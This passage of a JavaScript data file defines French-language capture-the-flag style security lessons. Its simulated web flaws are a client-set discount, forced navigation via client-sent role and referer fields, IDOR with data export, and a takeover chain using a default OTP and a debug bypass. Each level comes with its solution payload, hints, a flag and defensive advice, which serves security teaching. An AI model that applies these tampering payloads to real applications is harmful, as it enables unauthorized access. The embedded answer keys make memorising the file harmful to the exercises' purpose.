          if (isNaN(q) || q <= 0) return { fail: 'Il faut une quantité valide (qty ≥ 1) ET une remise. Deux champs à régler.' };
          return { fail: 'Remise de ' + (isNaN(d) ? '0' : d) + '% : pas encore gratuit. Monte la remise au maximum.' };
        }
      },
      story: 'Sixième étape. Le panier applique un pourcentage de remise ET une quantité, tous deux envoyés par le client. Deux champs à régler ensemble.',
      goal: 'Obtiens une commande gratuite :<pre>discount: 100\nqty: 1</pre>',
      lesson: '<p>Quand plusieurs valeurs de calcul viennent du client, on peut les combiner : une quantité valide + une remise de 100 % = total nul.</p>' +
        '<p>🛡 Défense : ne jamais recevoir une remise en pourcentage depuis le client ; la dériver d’un code promo validé et plafonné côté serveur.</p>',
      starter: 'discount: 10\nqty: 1\n',
      hints: ['Deux champs comptent : discount et qty.', 'Pousse la remise à 100 % avec une quantité valide.', 'discount: 100\nqty: 1'],
      solution: 'discount: 100\nqty: 1\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb10_7', ch: 10, ord: 7, title: 'Navigation forcée', job: 'Chapitre 10 · Mission rouge', stars: 5, scene: 'terminal',
      cyber: {
        sim: 'logic', flag: 'flag{navigation_forcee}',
        defense: 'Défense : le contrôle d’accès se fait sur l’identité de session, pas sur des indices (referer, step, role) fournis par le client.',
        state: function () { return { zone: 'public' }; },
        panel: function (st, req) {
          req = req || {};
          var c1 = req.step === 'admin', c2 = req.referer === '/admin/dashboard', c3 = req.role === 'admin';
          function row(k, v, ok) { return '<tr class="' + (ok ? 'cy-hit' : '') + '"><td>' + k + '</td><td>' + (v === undefined ? '—' : v) + '</td><td>' + (ok ? '✔' : '✗') + '</td></tr>'; }
          return { title: 'Console d’administration (zone ' + st.zone + ')', html: '<p class="cy-note">Trois conditions faibles, toutes fournies par le client, gardent la console admin.</p><table class="cy-res"><tr><th>paramètre</th><th>valeur</th><th>ok</th></tr>' + row('step', req.step, c1) + row('referer', req.referer, c2) + row('role', req.role, c3) + '</table>' };
        },
        check: function (st, req) {
          var c1 = req.step === 'admin', c2 = req.referer === '/admin/dashboard', c3 = req.role === 'admin';
          if (c1 && c2 && c3) return { ok: true, msg: 'Les trois vérifications côté client sont satisfaites : la console admin s’ouvre.', win: 'Navigation forcée : en fournissant step, referer et role, tu as atteint une zone interdite.' };
          var manque = [];
          if (!c1) manque.push('step=admin'); if (!c2) manque.push('referer=/admin/dashboard'); if (!c3) manque.push('role=admin');
          return { fail: 'Il manque : ' + manque.join(', ') + '. Toutes les conditions sont des champs que TU contrôles.' };
        }
      },
      story: 'Septième étape. La console d’admin se croit protégée par trois « vérifications » : une étape, un <code>referer</code> et un rôle — toutes envoyées par le client.',
      goal: 'Satisfais les trois conditions d’un coup :<pre>step: admin\nreferer: /admin/dashboard\nrole: admin</pre>',
      lesson: '<p>Empiler des contrôles faibles ne protège rien : si chacun repose sur un champ fourni par le client, l’attaquant les fournit tous. C’est de la <b>navigation forcée</b>.</p>' +
        '<p>🛡 Défense : une seule vérification qui compte — l’autorisation serveur liée à la session — et des URL non devinables ne suffisent jamais seules.</p>',
      starter: 'step: accueil\n',
      hints: ['Trois champs sont exigés : step, referer, role.', 'Donne exactement step=admin, referer=/admin/dashboard, role=admin.', 'step: admin\nreferer: /admin/dashboard\nrole: admin'],
      solution: 'step: admin\nreferer: /admin/dashboard\nrole: admin\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb10_8', ch: 10, ord: 8, title: 'IDOR et exfiltration', job: 'Chapitre 10 · Mission rouge', stars: 5, scene: 'terminal',
      cyber: {
        sim: 'logic', flag: 'flag{idor_plus_export}',
        defense: 'Défense : vérifier que l’utilisateur a le droit d’accéder à l’id demandé, et journaliser/limiter les exports de données.',
        state: function () { return { session: 'bob', comptes: { '1001': { owner: 'bob' }, '9999': { owner: 'PDG' } } }; },
        panel: function (st, req) {
          req = req || {};
          var exp = String(req.export).toLowerCase() === 'true';
          var rows = '';
          for (var id in st.comptes) rows += '<tr class="' + (req.account === id ? 'cy-hit' : '') + '"><td>' + id + '</td><td>' + st.comptes[id].owner + '</td></tr>';
          return { title: 'API comptes — session : ' + st.session, html: '<p class="cy-note">Tu es « ' + st.session + ' » (compte 1001). L’API ne vérifie pas la propriété de « account », et « export » déverrouille le détail complet.</p><table class="cy-res"><tr><th>account</th><th>owner</th></tr>' + rows + '</table><p class="cy-note">export : ' + (exp ? 'ON (données détaillées)' : 'OFF') + '</p>' };
        },
        check: function (st, req) {
          if (!st.comptes[req.account]) return { fail: 'Le compte « ' + (req.account || 'absent') + ' » n’existe pas.' };
          var exp = String(req.export).toLowerCase() === 'true';
          if (req.account === '9999' && exp) return { ok: true, msg: 'Compte 9999 (PDG) exporté en entier : données sensibles exfiltrées.', win: 'IDOR + export : tu as lu ET exfiltré un compte qui n’est pas le tien.' };
          if (req.account === '9999') return { fail: 'Tu lis bien le compte du PDG (IDOR), mais il faut aussi activer l’export pour tout récupérer.' };
          return { fail: 'Compte ' + req.account + ' (' + st.comptes[req.account].owner + ') : ce n’est pas la cible. Vise le compte du PDG, puis exporte.' };
        }
      },
      story: 'Huitième étape. L’API des comptes ne vérifie pas à qui appartient le compte demandé (IDOR), et un champ <code>export</code> permet de tout télécharger.',
      goal: 'Combine les deux failles : lis le compte du PDG ET active l’export :<pre>account: 9999\nexport: true</pre>',
      lesson: '<p>On enchaîne deux faiblesses : d’abord une référence directe non protégée (lire <code>account=9999</code>), puis une fonction d’export qui ne vérifie pas non plus les droits. Chacune seule est grave ; ensemble, c’est une exfiltration.</p>' +
        '<p>🛡 Défense : contrôle d’accès par objet (le compte doit t’appartenir), et surveillance/limitation des exports massifs.</p>',
      starter: 'account: 1001\nexport: false\n',
      hints: ['Deux failles à chaîner : l’id d’un autre compte + l’export.', 'Le compte du PDG est 9999 ; active export=true.', 'account: 9999\nexport: true'],
      solution: 'account: 9999\nexport: true\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb10_9', ch: 10, ord: 9, title: 'La chaîne complète', job: 'Chapitre 10 · Mission rouge', stars: 5, scene: 'terminal',
      cyber: {
        sim: 'logic', flag: 'flag{chaine_complete}',
        defense: 'Défense : chaque maillon doit être solide — pas d’énumération d’utilisateurs, pas d’OTP par défaut, pas de mode debug, et une portée d’accès minimale vérifiée côté serveur.',
        state: function () { return { cible: 'admin' }; },
        panel: function (st, req) {
          req = req || {};
          var c1 = req.user === 'admin', c2 = req.otp === '000000', c3 = req.debug === '1', c4 = req.scope === 'all';
          function row(k, v, ok, note) { return '<tr class="' + (ok ? 'cy-hit' : '') + '"><td>' + k + '</td><td>' + (v === undefined ? '—' : v) + '</td><td>' + (ok ? '✔' : '✗') + '</td><td>' + note + '</td></tr>'; }
          return { title: 'Prise de contrôle totale', html: '<p class="cy-note">Quatre maillons à enchaîner pour le contrôle complet du compte admin.</p><table class="cy-res"><tr><th>param</th><th>valeur</th><th>ok</th><th>maillon</th></tr>' + row('user', req.user, c1, 'énumération : le compte cible') + row('otp', req.otp, c2, 'OTP par défaut 000000') + row('debug', req.debug, c3, 'bypass OTP en mode debug') + row('scope', req.scope, c4, 'portée maximale') + '</table>' };
        },
        check: function (st, req) {
          var c1 = req.user === 'admin', c2 = req.otp === '000000', c3 = req.debug === '1', c4 = req.scope === 'all';
          if (c1 && c2 && c3 && c4) return { ok: true, msg: 'Compte admin pris : utilisateur énuméré, OTP par défaut accepté grâce au mode debug, portée « all ».', win: 'Chaîne complète : énumération + OTP faible + bypass debug + portée maximale = prise de contrôle totale.' };
          var manque = [];
          if (!c1) manque.push('user=admin'); if (!c2) manque.push('otp=000000'); if (!c3) manque.push('debug=1'); if (!c4) manque.push('scope=all');
          return { fail: 'Maillons manquants : ' + manque.join(', ') + '. Il faut enchaîner les quatre.' };
        }
      },
      story: 'Dernier entraînement avant le contrat final rouge. Un seul payload doit enchaîner quatre faiblesses pour prendre le contrôle complet du compte admin.',
      goal: 'Assemble toute la chaîne :<pre>user: admin\notp: 000000\ndebug: 1\nscope: all</pre>',
      lesson: '<p>Une vraie attaque enchaîne de petites failles : on énumère le compte cible (<code>admin</code>), on exploite un OTP par défaut (<code>000000</code>) qu’un mode <code>debug</code> oublié accepte, puis on demande la portée maximale (<code>scope=all</code>).</p>' +
        '<p>Aucune de ces failles n’est spectaculaire seule — mais mises bout à bout, elles donnent tout.</p>' +
        '<p>🛡 Défense : solidifier chaque maillon (pas d’énumération, OTP aléatoire, pas de debug en prod, moindre privilège) ; la défense en profondeur casse la chaîne.</p>',
      starter: 'user: admin\notp: 123456\n',
      hints: ['Quatre champs à régler ensemble : user, otp, debug, scope.', 'user=admin, otp=000000, debug=1, scope=all.', 'user: admin\notp: 000000\ndebug: 1\nscope: all'],
      solution: 'user: admin\notp: 000000\ndebug: 1\nscope: all\n',
      tests: [{}], rules: {}
    }
  );
})(typeof window !== 'undefined' ? window : globalThis);
